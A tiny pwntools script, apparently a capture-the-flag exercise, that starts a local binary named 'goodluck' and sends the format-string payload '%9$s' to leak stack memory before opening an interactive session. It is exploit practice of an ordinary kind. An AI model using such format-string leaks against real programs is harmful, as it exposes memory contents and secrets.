from pwn import *

sh = process(['/mnt/hgfs/CyberSecurity/PWN/test/fmtstr2/goodluck'])
payload = "%9$s"
sh.sendline(payload)
sh.interactive()
